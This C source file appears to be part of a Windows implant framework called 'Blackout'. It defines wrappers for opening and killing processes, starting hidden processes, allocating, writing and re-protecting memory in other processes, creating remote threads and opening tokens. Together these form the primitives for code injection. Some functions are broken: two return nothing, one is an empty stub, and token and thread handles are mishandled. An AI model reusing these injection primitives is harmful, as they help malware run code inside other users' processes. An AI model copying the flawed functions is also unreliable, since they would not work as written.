#include <utils.h>
#include <common.h>

/*=================================[ Heap bkAPIs ]=================================*/

FUNC PVOID bkHeapAlloc(
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Blackout().Heap, HEAP_ZERO_MEMORY, Size );

    return VmHeap;
}

FUNC PVOID bkHeapReAlloc(
    _In_ PVOID  Addr,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Blackout().Heap, HEAP_ZERO_MEMORY, Addr, Size );

    return VmHeap;
}

FUNC BOOL bkHeapFree(
    _In_ PVOID  Data,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    MmZero( Data, Size );
    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Blackout().Heap, NULL, Data );
    Data = NULL;

    return bSuc;
}

/*=================================[ Process bkAPIs ]=================================*/

FUNC DWORD bkProcessOpen(
    _In_ DWORD DesiredAccess,
    _In_ BOOL  InheritHandle,
    _In_ DWORD ProcessId,
    _Out_ HANDLE *ProcessHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

#ifdef BK_WINAPI
    *ProcessHandle = Instance()->Win32.OpenProcess( DesiredAccess, InheritHandle, ProcessId );
    Err = NtLastError();
#elif BK_NTAPI
    CLIENT_ID ClientId    = { 0 };
    HANDLE    hProcessTmp = NULL;
    OBJECT_ATTRIBUTES ProcAttr = RTL_CONSTANT_OBJECT_ATTRIBUTES( NULL, 0 );

    MmZero( &ClientId, sizeof( CLIENT_ID ) );
    
    ClientId.UniqueProcess = ProcessId;

    Err = Instance()->Win32.NtOpenProcess( &hProcessTmp, DesiredAccess, &ProcAttr, &ClientId );
    *ProcessHandle = hProcessTmp; 
#endif
    return Err;
}

FUNC DWORD bkProcessTerminate( 
    _In_ HANDLE hProcess,
    _In_ UINT32 ExitStatus
) {
    BLACKOUT_INSTANCE

#ifdef BK_WINAPI
    Instance()->Win32.TerminateProcess( hProcess, ExitStatus );
#elif BK_NTAPI
    Instance()->Win32.NtTerminateProcess( hProcess, ExitStatus );
#endif
    return NtLastError();
}

FUNC DWORD bkProcessCreate(
    _In_ PSTR ProcCmd,
    _In_ BOOL InheritHandle,
    _In_opt_  DWORD   Flags,
    _Out_opt_ HANDLE *ProcessHandle,
    _Out_opt_ DWORD  *ProcessId,
    _Out_opt_ HANDLE *ThreadHandle,
    _Out_opt_ DWORD  *ThreadId
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;

    PROCESS_INFORMATION Pi = { 0 };
    STARTUPINFOA        Si = { 0 };

    MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
    MmZero( &Si, sizeof( STARTUPINFOA ) );

    Si.cb = sizeof( STARTUPINFOA );
    Si.wShowWindow = SW_HIDE;

    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si, &Pi );
    if ( !bCheck )
        return NtLastError();

    *ProcessId     = Pi.dwProcessId;
    *ProcessHandle = Pi.hProcess;
    *ThreadId      = Pi.dwThreadId;
    *ThreadHandle  = Pi.hThread;

    return NtLastError();    
}

/*=================================[ Memory bkAPIs ]=================================*/

FUNC DWORD bkMemAlloc(
    _In_opt_    HANDLE  ProcessHandle,
    _Inout_opt_ PVOID  *BaseAddr,
    _In_        UINT64  RegionSize,
    _In_        DWORD   AllocationType,
    _In_        DWORD   Protection
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        *BaseAddr = Instance()->Win32.VirtualAllocEx( ProcessHandle, *BaseAddr, RegionSize, AllocationType, Protection );

    } else {
        *BaseAddr = Instance()->Win32.VirtualAlloc( NULL, RegionSize, AllocationType, Protection );
    }

    Err = NtLastError();
#elif BK_NTAPI
    PVOID  MemAllocated    = NULL;

    if ( !ProcessHandle )    
        ProcessHandle = NtCurrentProcess();

    Err = Instance()->Win32.NtAllocateVirtualMemory( ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection );

    *BaseAddr   = MemAllocated;
#endif

    return Err;
}

FUNC DWORD bkMemWrite(
    _In_ HANDLE ProcessHandle,
    _In_ PBYTE  MemBaseAddr,
    _In_ PBYTE  Buffer,
    _In_ DWORD  BufferSize
) {
    BLACKOUT_INSTANCE

    DWORD  Err = 0;
    UINT64 BytesWritten = 0;

#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        Instance()->Win32.WriteProcessMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
    }
    else {
        MmCopy( MemBaseAddr, Buffer, BufferSize );
    }

    Err = NtLastError();
#elif BK_NTAPI
    if ( !ProcessHandle )    
        ProcessHandle = NtCurrentProcess();

    Err = Instance()->Win32.NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
#endif
    return Err;
}

FUNC DWORD bkMemProtect(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID  BaseAddr,
    _In_ UINT64 RegionSize,
    _In_ DWORD  NewProtection
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
    DWORD OldProtection = NULL;
#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        Instance()->Win32.VirtualProtectEx( ProcessHandle, BaseAddr, RegionSize, NewProtection, &OldProtection );
    } else {
        Instance()->Win32.VirtualProtect( BaseAddr, RegionSize, NewProtection, &OldProtection );
    }

    Err = NtLastError();
#elif BK_NTAPI
    if ( !ProcessHandle )    
        ProcessHandle = NtCurrentProcess();
    Err = Instance()->Win32.NtProtectVirtualMemory( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
#endif

    return Err;
}

FUNC DWORD bkMemQuery(
    _In_opt_ HANDLE  ProcessHandle,
    _In_     PVOID   BaseAddress,
    _Out_    PVOID  *AllocationBase,
    _Out_    DWORD  *AllocationProtect,
    _Out_    PVOID  *BaseAddressRt,
    _Out_    DWORD  *Protect,
    _Out_    DWORD  *RegionSize,
    _Out_    DWORD  *State,
    _Out_    DWORD  *Type
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    MEMORY_BASIC_INFORMATION Mbi = { 0 };
    MmZero( &Mbi, sizeof( MEMORY_BASIC_INFORMATION ) );
#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        Instance()->Win32.VirtualQueryEx( ProcessHandle, BaseAddress, &Mbi, sizeof( MEMORY_BASIC_INFORMATION ) );
    } else {
        Instance()->Win32.VirtualQuery( BaseAddress, &Mbi, sizeof( MEMORY_BASIC_INFORMATION ) );
    }

    Err = NtLastError();
#elif BK_NTAPI
    if ( !ProcessHandle )
        ProcessHandle = NtCurrentProcess();

    Err = Instance()->Win32.NtQueryVirtualMemory(
        ProcessHandle, BaseAddress,
        MemoryBasicInformation, &Mbi,
        sizeof(MEMORY_BASIC_INFORMATION), NULL
    );
#endif

    *AllocationBase    = Mbi.AllocationBase;
    *AllocationProtect = Mbi.AllocationProtect;
    *BaseAddressRt     = Mbi.BaseAddress;
    *Protect           = Mbi.Protect;
    *RegionSize        = Mbi.RegionSize;
    *State             = Mbi.State;
    *Type              = Mbi.Type;

    return Err;
}

FUNC DWORD bkMemFree(
    _In_opt_ HANDLE ProcessHandle,
    _In_     PVOID  MemAddress,
    _In_     UINT64 SizeToFree
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
#ifdef BK_WINAPI
    if ( ProcessHandle ) {
        Instance()->Win32.VirtualFreeEx( ProcessHandle, MemAddress, SizeToFree, MEM_RELEASE );
    } else {
        Instance()->Win32.VirtualFree( MemAddress, SizeToFree, MEM_RELEASE );
    }

    Err = NtLastError(); 
#elif  BK_NTAPI
    Err = Instance()->Win32.NtFreeVirtualMemory( ProcessHandle, &MemAddress, SizeToFree, MEM_RELEASE );
#endif

    return Err;
}

/*=================================[ Thread bkAPIs ]=================================*/

FUNC DWORD bkThreadCreate( 
    _In_     HANDLE  ProcessHandle,
    _In_     PVOID   BaseAddr,
    _In_opt_ PVOID   Parameter,
    _In_     DWORD   Flags,
    _In_     DWORD   StackSize,
    _In_opt_ PDWORD  ThreadId,
    _In_opt_ PHANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
#ifdef BK_WINAPI
    DWORD ThreadIdTmp = 0;
    if ( ProcessHandle ) {
        ThreadHandle = Instance()->Win32.CreateRemoteThread( ProcessHandle, NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
        *ThreadId = ThreadIdTmp;
    } else {
        ThreadHandle = Instance()->Win32.CreateThread( NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
        *ThreadId = ThreadIdTmp;
    }

    Err = NtLastError();
#elif BK_NTAPI
    Err = Instance()->Win32.NtCreateThreadEx( &ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, BaseAddr, Parameter, Flags, 0, StackSize, 0, NULL );
    *ThreadId = Instance()->Win32.GetThreadId( ThreadHandle );
#endif
    
    return Err;
}

FUNC DWORD bkThreadTerminate(
    _In_ HANDLE ThreadHandle,
    _In_ DWORD  ExitCode
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
#ifdef BK_WINAPI
    Instance()->Win32.TerminateThread( ThreadHandle, ExitCode );
    Err = NtLastError();
#elif  BK_NTAPI
    Err = Instance()->Win32.NtTerminateThread( ThreadHandle, ExitCode );
#endif

    return Err;
}

FUNC DWORD bkThreadSuspend(
    _In_ HANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
#ifdef BK_WINAPI
    Instance()->Win32.SuspendThread( ThreadHandle );
    Err = NtLastError();
#elif  BK_NTAPI
    Err = Instance()->Win32.NtSuspendThread( ThreadHandle, NULL );
#endif
    return Err;
}

FUNC DWORD bkThreadResume(
    _In_ HANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
#ifdef BK_WINAPI
    Instance()->Win32.ResumeThread( ThreadHandle );
    Err = NtLastError();
#elif BK_NTAPI
    Err = Instance()->Win32.NtResumeThread( ThreadHandle, NULL );
#endif
    return Err;
}

/*=================================[ Token bkAPIs ]=================================*/

FUNC DWORD bkTokenOpen(
    _In_ HANDLE  TargetHandle,
    _In_ DWORD   AccessRights,
    _In_ PHANDLE TokenHandle,
    _In_ UINT16  ObjectType
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( ObjectType == 0x01 ) {
#ifdef BK_WINAPI
        Instance()->Win32.OpenProcessToken( TargetHandle, AccessRights, &TokenHandle );
        Err = NtLastError();
#elif  BK_NTAPI
        Err = Instance()->Win32.NtOpenProcessToken( TargetHandle, AccessRights, &TokenHandle );
#endif
    } else if ( ObjectType == 0x02 ) {
#ifdef BK_WINAPI
        Instance()->Win32.OpenThreadToken( TargetHandle, AccessRights, FALSE, &TokenHandle );
        Err = NtLastError();
#elif  BK_NTAPI
        Err = Instance()->Win32.NtOpenThreadToken( TargetHandle, AccessRights, FALSE, &TokenHandle );
#endif
    } else {
        Err = ERROR_INVALID_PARAMETER;
    } 
}

/*=================================[ Miscellaneous bkAPIs ]=================================*/

FUNC BOOL bkHandleClose(
    _In_ HANDLE hObject
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;
#ifdef BK_WINAPI
    Instance()->Win32.CloseHandle( hObject );
#elif  BK_NTAPI
    Instance()->Win32.NtClose( hObject );
#endif

    return bCheck;
}

FUNC DWORD bkFileCreate( 
    _In_ PSTR FileName,
    _In_ DWORD AccessRights
) {
    BLACKOUT_INSTANCE

    //Instance()->Win32.CreateFileA( FileName, AccessRights. )

} 

FUNC DWORD bkPipeCreate(
    _Out_ PHANDLE hStdPipeRead,
    _Out_ PHANDLE hStdPipeWrite
) {
    BLACKOUT_INSTANCE

    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecurityAttr, 0 );

    return NtLastError();
}